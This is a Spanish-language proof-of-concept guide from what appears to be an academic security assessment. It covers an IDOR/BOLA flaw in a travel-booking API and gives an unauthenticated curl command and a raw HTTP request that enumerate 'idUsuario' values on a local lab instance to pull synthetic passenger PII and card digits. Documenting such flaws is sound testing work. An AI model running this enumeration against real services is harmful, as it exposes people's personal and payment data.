# Guía de Prueba de Concepto: PoC-01 — Insecure Direct Object References (IDOR / BOLA) en Consulta de Reservas

**Vulnerabilidad:** H-03 — Fuga Masiva de Información Personal e IDOR en `/api/obtener_reservas`  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-284  
**OWASP Top 10:2021:** A01:2021 - Broken Access Control  
**Severidad:** Crítica  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
El endpoint `GET /api/obtener_reservas` está declarado en `SecurityConfig.java:152` como `permitAll()`. El controlador adaptador `ObtenerReservasHandler.java` lee el parámetro de consulta `idUsuario` o `correo`. Si el cliente envía dicho parámetro, el código ignora si el usuario está autenticado y no comprueba si el `idUsuario` consultado pertenece a quien realiza la petición. Como resultado, un atacante puede extraer el historial completo de reservas, datos personales (PII) de los pasajeros (nombres, DNI, teléfono) y datos financieros de pago (tipo de tarjeta, últimos 4 dígitos) de cualquier usuario de la plataforma simplemente incrementando el identificador numérico.

---

## 2. Precondiciones
1. Contenedores Docker locales levantados y saludables (`travelink-db` y `travelink-app`).
2. Base de datos inicializada con el seed sintético (`sql/seed_pruebas.sql`):
   - Usuario `turista_a@test.local` (`idUsuario = 101`), titular de la Reserva `#500`.
   - Usuario `turista_b@test.local` (`idUsuario = 102`), titular de la Reserva `#501`.

---

## 3. Procedimiento de Ejecución Manual (Request Exacta)

### Opción A: Ejecución mediante `curl` en Terminal (Sin autenticación)
Ejecutar la siguiente petición HTTP sin enviar cookies ni cabeceras de autorización:

```bash
curl -i -s -X GET "http://127.0.0.1:8080/api/obtener_reservas?idUsuario=101" \
     -H "Accept: application/json"
```

### Opción B: Petición HTTP cruda para Burp Suite Repeater / ZAP Request Editor
```http
GET /api/obtener_reservas?idUsuario=101 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Connection: close

```

---

## 4. Respuesta Esperada (Comportamiento Vulnerable)
- **Código de Estado HTTP:** `200 OK`
- **Cabeceras:** `Content-Type: application/json;charset=UTF-8`
- **Cuerpo de Respuesta (JSON):** Contiene la reserva `#500` con código `"TRV-1001-A"`, precio total, nombres de pasajeros ("Turista A Test", DNI `"70112233"`), método de pago `"TARJETA"`, marca `"VISA"` y últimos dígitos `"4242"`.

```json
{
  "status": "success",
  "reservas": [
    {
      "id": 500,
      "codigo": "TRV-1001-A",
      "titulo": "Aventura Clásica en Machu Picchu",
      "total": 350.00,
      "marcaTarjeta": "VISA",
      "ultimosDigitos": "4242",
      "pasajeros": [
        {
          "idPasajero": 1,
          "nroDocumento": "70112233",
          "nombre": "Turista A",
          "apellidoPaterno": "Test",
          "esTitular": true
        }
      ]
    }
  ]
}
```

---

## 5. Qué Capturar para el Informe Académico
1. **Terminal / Burp Suite Repeater:** Captura de pantalla de la petición `GET /api/obtener_reservas?idUsuario=101` sin cookie de sesión devolviendo `HTTP 200 OK` con los datos de pasajeros y tarjeta.
2. **Prueba Cruzada:** Captura repitiendo la petición con `?idUsuario=102` y comprobando que devuelve la reserva de Turista B (`TRV-1002-B`).
3. **Evidencia DBeaver:** Consulta `SELECT idReserva, idUsuario, codigoReserva FROM Reserva;` para contrastar que los datos extraídos coinciden con la base de datos sin haber tenido permisos.

---

## 6. Resultado Real (Completar tras la prueba)
*(Espacio reservado para el evaluador)*

```text

```
